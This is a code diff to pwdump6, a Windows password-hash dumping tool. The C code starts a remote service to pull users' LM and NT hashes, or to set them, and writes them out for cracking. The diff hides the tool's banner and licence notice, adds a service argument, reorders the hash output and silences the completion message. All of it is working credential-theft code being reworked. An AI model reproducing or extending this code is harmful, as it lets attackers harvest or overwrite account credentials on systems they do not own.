@@ -171,7 +171,7 @@ int main(int argc, char* argv[])
 	char szDestinationServicePath[MAX_PATH];
 	char szDestinationDllPath[MAX_PATH];
 	char* szSelectedShareName = NULL;
-    char* varg[7];
+    char* varg[8];
 	char dwLen;
 	SERVICE_STATUS statusService;
 	BOOL bSkipHistories = FALSE;
@@ -195,6 +195,7 @@ int main(int argc, char* argv[])
         return 0;
     }
 
+	/*
 	fprintf(stderr, "\npwdump6 Version %s by fizzgig and the mighty group at foofus.net\n", PWDUMP_VERSION);
 	fprintf(stderr, "** THIS IS A BETA VERSION! YOU HAVE BEEN WARNED. **\n");
     fprintf(stderr, "Copyright 2009 foofus.net\n\n");
@@ -204,6 +205,7 @@ int main(int argc, char* argv[])
     fprintf(stderr, "Foundation.  NO WARRANTY, EXPRESSED OR IMPLIED, IS GRANTED WITH THIS\n");
     fprintf(stderr, "PROGRAM.  Please see the COPYING file included with this program\n");
     fprintf(stderr, "and the GNU GPL for further details.\n\n" );
+	*/
 
 	while ((c = getopt(argc, argv, "xnhu:o:p:s:i:")) != EOF)
 	{
@@ -581,11 +583,12 @@ int main(int argc, char* argv[])
 		varg[1] = (char*)pEncryptionKey;
 		varg[4] = szServiceFileName;
 		varg[5] = szRemoteLsaExtPath;
+		varg[6] = szCurrentDir;
 
 		if (setPasswordHash) {
-			varg[6] = "set";
+			varg[7] = "set";
 		} else {
-			varg[6] = "dump";
+			varg[7] = "dump";
 		}
 		memcpy(szTemp1, &dwLen, 1);
 		varg[2] = szTemp1;
@@ -595,7 +598,7 @@ int main(int argc, char* argv[])
 
 		Blowfish_Init(&ctx, pEncryptionKey, dwLen);
 
-		if(!StartService(hsvc, 7, (const char**)varg))
+		if(!StartService(hsvc, 8, (const char**)varg))
 		{
             sprintf(errMsg, "Service start failed: %d (%s/%s)\n", GetLastError(), szRemoteServicePath, szGUIDServiceName);
             throw errMsg;
@@ -694,11 +697,11 @@ int main(int argc, char* argv[])
 
                 // display data in L0phtCrack-compatible format
 				// Try converting data to Unicode
-                fwprintf(outfile, L"%ls:%ls:%ls:::\n", pTemp->wszUser, LMdata, NTdata);
+                fwprintf(outfile, L"%ls:%ls%ls\n", pTemp->wszUser, NTdata, LMdata);
 			}
 		}
 
-        throw "Completed.\n";
+        // throw "Completed.\n";
     }
 
     // clean up
